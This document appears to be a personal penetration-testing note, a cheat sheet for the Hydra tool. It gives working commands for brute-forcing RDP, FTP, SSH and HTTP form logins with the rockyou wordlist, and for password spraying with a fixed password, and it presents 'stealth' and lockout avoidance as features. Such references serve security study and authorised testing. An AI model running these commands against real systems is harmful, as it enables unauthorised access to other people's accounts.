---
title: Hydra
updated: 2025-05-12 03:17:30Z
created: 2025-04-24 13:33:44Z
latitude: -33.78668940
longitude: 150.95264980
altitude: 0.0000
---

## Professional Hydra Integration

> **Note**: Now includes advanced brute force capabilities. See [Professional Cracking Suite](Professional%20Cracking%20Suite.md) for complete features.

## Professional Features

- **Multi-protocol Support**: SSH, RDP, FTP, HTTP, SMB
- **Password Spraying**: Avoid account lockouts
- **Rate Limiting**: Stealth attack capabilities
- **Custom Wordlists**: Targeted password lists

## Bruteforcing with Hydra

RDP:
`hydra -l <user> -P rockyou.txt rdp://<target>`

FTP:
`hydra -l <user> -I -P rockyou.txt -s 21 ftp://<target>`

SSH:
`hydra -l <user> -P rockyou.txt -s <target_port> ssh://<target>`

HTTP POST:
`hydra -l <user> -P rockyou.txt <target> http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"`

`hydra -l <user> -P <wordlist> <target> -t 4 ssh -V`

## Password Spraying with Hydra

`hydra -L /usr/share/wordlists/dirb/others/names.txt -p "Pa55w0rd" ssh://<target>`
`hydra -L /usr/share/wordlists/dirb/others/names.txt -p "Pa55w0rd" rdp://<target>`
